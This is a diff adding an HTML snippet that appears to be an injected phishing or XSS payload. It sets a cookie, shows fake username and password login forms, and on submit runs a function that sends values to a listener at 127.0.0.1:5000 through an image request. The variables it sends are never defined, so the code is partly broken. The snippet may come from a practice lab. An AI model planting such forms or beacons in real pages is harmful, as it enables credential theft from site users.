@@ -1,0 +1,45 @@
+<script type="text/javascript">document.cookie = "username=Null Byte";</script>
+
+
+<form action="handle_data" method="post" name="login" id="login" onsubmit="return (confirminput(login))">
+    <table>
+      <tbody><tr>
+        <td>
+          Username:
+        </td>
+        <td>
+          <input type="text" id="uid" name="uid" value="" style="width: 150px;">
+        </td>
+        <td>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          Password:
+        </td>
+        <td>
+          <input type="password" id="passw" name="passw" style="width: 150px;">
+          </td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>
+            <input type="submit" name="btnSubmit" value="Login" onclick="redirectfunction()">
+          </td>
+        </tr>
+    </tbody></table>
+  </form>
+  <button type="submit">Login</button>
+
+  <script>
+      function redirectfunction(){
+        new Image().src = 'http://127.0.0.1:5000'+ ' TRANSACTION1 ' + a + ' TRANSACTION2 ' + b;
+      }
+  </script>
+
+
+<form id="foo" method="post" action="/handle_data">
+    Username : <input type="text" name='uid' value="admin">
+    Password : <input type="password" name='passw' value="">
+    <input type="submit" name="submit" value="Submit">
+</form>
